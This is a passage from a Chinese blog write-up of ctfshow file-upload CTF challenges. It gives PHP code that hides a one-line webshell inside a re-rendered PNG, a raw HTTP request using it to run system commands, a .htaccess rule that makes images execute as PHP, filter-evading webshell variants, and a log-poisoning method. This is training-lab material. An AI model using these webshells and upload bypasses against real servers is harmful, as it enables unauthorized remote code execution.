class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">    <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">    <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">    <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;1.png&#x27;</span>);  <span class="comment">//要修改的图片的路径 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 木马内容</span></span><br><span class="line"><span class="comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//imagepng($img,&#x27;1.png&#x27;);  要修改的图片的路径,1.png是使用的文件，可以不存在</span></span><br><span class="line"><span class="comment">//会在目录下自动创建一个1.png图片</span></span><br><span class="line"><span class="comment">//图片脚本内容：$_GET[0]($_POST[1]);</span></span><br><span class="line"><span class="comment">//使用方法：例子：查看图片，get传入0=system；post传入tac flag.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688451112419-1980ecb8-25aa-44d8-b6fe-14b539de29fc.png" alt="img"></p>
<p>可以看到木马是以短标签写进去的</p>
<p>抓包执行即可</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /download.php?image=<span class="number">4</span>a47a0db6e60853dedfcfdf08a5ca249.png&amp;<span class="number">0</span>=system HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">6</span>a0dd0db-<span class="number">7621</span>-<span class="number">467</span>f-<span class="number">8</span>c76-dd8bd63732b6.challenge.ctf.show</span><br><span class="line">Content-Length: <span class="number">14</span></span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Origin: http:<span class="comment">//6a0dd0db-7621-467f-8c76-dd8bd63732b6.challenge.ctf.show</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">114.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Referer: http://6a0dd0db-7621-467f-8c76-dd8bd63732b6.challenge.ctf.show/</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Cookie: _ga=GA1.2.729509020.1680361470</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1=cat+flag.php</span></span><br></pre></td></tr></table></figure>

<h1 id="WEB-165-jpg二次渲染"><a href="#WEB-165-jpg二次渲染" class="headerlink" title="WEB-165(jpg二次渲染)"></a>WEB-165(jpg二次渲染)</h1><p>傻逼题 没啥好说的</p>
<h1 id="WEB-166-zip"><a href="#WEB-166-zip" class="headerlink" title="WEB-166(zip)"></a>WEB-166(zip)</h1><p>给zip后面添加一句话上传 然后包含执行 题目环境有问题 返回包是空的</p>
<h1 id="WEB-167-htaccess"><a href="#WEB-167-htaccess" class="headerlink" title="WEB-167(.htaccess)"></a>WEB-167(.htaccess)</h1><p>报500错误 环境有问题 无语了</p>
<p>.htaccess也是php的配置文件 是一个局部配置文件 只对该文件所在目录下的文件起作用</p>
<p>我们可以上传上去jpg文件 但是不是php文件 无法解析</p>
<p>所以我们需要.htaccess这个文件去将我们的jpg文件解析成php文件 </p>
<p>内容：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;1.jpg&quot;</span>&gt; <span class="comment">//需要解析的文件名</span></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<h1 id="WEB-168-免杀"><a href="#WEB-168-免杀" class="headerlink" title="WEB-168(免杀)"></a>WEB-168(免杀)</h1><p>过滤了eval get post system</p>
<p>paylaod:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`<span class="variable">$_REQUEST</span>[<span class="number">1</span>]`;<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> `<span class="variable">$_REQUEST</span>[x]`;<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$_REQUEST</span>[<span class="number">1</span>](<span class="variable">$_REQUEST</span>[<span class="number">2</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="string">&#x27;syste&#x27;</span>.<span class="string">&#x27;m&#x27;</span>;(<span class="variable">$a</span>)(<span class="string">&#x27;ls ../&#x27;</span>);    <span class="comment">//拼接</span></span><br></pre></td></tr></table></figure>

<p>当时用反引号做的时候一直在想为什么返回包是空白 后来才想到这个反引号没有回显 要用echo一下 或者搭配短标签</p>
<h1 id="WEB-169-WEB-170-日志包含"><a href="#WEB-169-WEB-170-日志包含" class="headerlink" title="WEB-169~WEB-170(日志包含)"></a>WEB-169~WEB-170(日志包含)</h1><p>可以上传php文件到upload下然后上传user.ini 里面的内容指向nginx的日志文件 然后请求头写入一句话木马 去包含访问即可</p>
<h1 id="结尾："><a href="#结尾：" class="headerlink" title="结尾："></a>结尾：</h1><p>真被某些题环境搞心态了 </p>
<p>继续下一大陆 sql注入！！！！！！！！！！！！！！！！！！！</p>
<h1 id=""><a href="#" class="headerlink" title=""></a></h1>
                    </article>
                    


    <blockquote id="date-expire-notification" class="post-expired-notify">本文最后更新于 <span id="date-expire-num"></span> 天前，文中所描述的信息可能已发生改变</blockquote>
    <script>
    (function() {
        var dateUpdate = Date.parse("2023-07-25");
        var nowDate = new Date();
        var a = nowDate.getTime();
        var b = a - dateUpdate;
        var daysUpdateExpire = Math.floor(b/(24*3600*1000));
        if (daysUpdateExpire >= 120) {
            document.getElementById('date-expire-num').innerHTML = daysUpdateExpire;
        } else {
            document.getElementById('date-expire-notification').style.display = 'none';
        }
    })();
    </script>


<p class="post-footer-info mb-0 pt-0">本文发表于&nbsp;<time datetime="2023-07-04T08:32:29.000Z" itemprop="datePublished">2023-07-04</time>

    , 最后修改于&nbsp;<time datetime="2023-07-25T11:50:17.839Z" itemprop="dateModified">2023-07-25</time>

</p>
<p class="post-footer-info mb-0 pt-2">

<span class="post-categories-list mt-2">

<a class="post-categories-list-item" href='/categories/ctfshow/'>ctfshow</a>

</span>



<span class="post-tags-list mt-2">

<a class="post-tags-list-item" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">#&nbsp;文件上传</a>

</span>


</p>

                </div>
                <div class="post-nav px-2 bg-gray">
<ul class="pagination">
    <!-- Prev Nav -->
    
        <li class="page-item page-prev">
            <a href="/post/4fb535d6.html" rel="prev">
                <div class="page-item-title"><i class="icon icon-back" aria-hidden="true"></i></div>
                <div class="page-item-subtitle">ctfshow-反序列化</div>
            </a>
        </li>
    

    <!-- Next Nav -->
    
        <li class="page-item page-next">
            <a href="/post/61d76257.html" rel="next">
                <div class="page-item-title"><i class="icon icon-forward" aria-hidden="true"></i></div>
                <div class="page-item-subtitle">ctfshow-php特性</div>
            </a>
        </li>
    
</ul>
</div>

                
                    <!-- # Comment # -->
                    
                
            </div>
        </div>
    </div>
</div>

            <!-- ### Footer ### -->
            <footer class="text-center">
    <!-- footer copyright -->
    
        <p class="footer-copyright mb-0">Copyright&nbsp;©&nbsp;<span id="copyright-year"></span>
            <a class="footer-copyright-a" href="https://z1d10t.fun">Z1d10tのBlog</a>
        </p>

    <!-- footer custom text -->
    <p class="footer-text mb-0">
    
    </p>
    <!-- footer develop info -->
    <p class="footer-develop mb-0">
        

        
        Powered by&nbsp;<!--
         --><a href="https://hexo.io" target="_blank" class="footer-develop-a" rel="external nofollow noopener noreferrer">Hexo</a><span class="footer-develop-divider"></span>Theme&nbsp;-&nbsp;<!--
         --><a href="https://github.com/SukkaW/hexo-theme-suka" target="_blank" class="footer-develop-a" rel="external noopener">Suka</a>
    </p>
</footer>


        <!-- ### Import File ### -->
        <!-- ### Footer JS Import ### -->

<script>

    
window.lazyLoadOptions = {
    elements_selector: ".lazyload",
    threshold: 50
};
document.getElementById('copyright-year').textContent = new Date().getFullYear();
console.log('\n %c Suka Theme (hexo-theme-suka) | © SukkaW | Verision 1.3.3 %c https://github.com/SukkaW/hexo-theme-suka \n', 'color: #fff; background: #444; padding:5px 0;', 'background: #bbb; padding:5px 0;');

</script>

<script src="/lib/vanilla-lazyload/lazyload.min.js" async></script>



<!-- Comment -->


<!-- ### Custom Footer ### -->

    </body>

</html>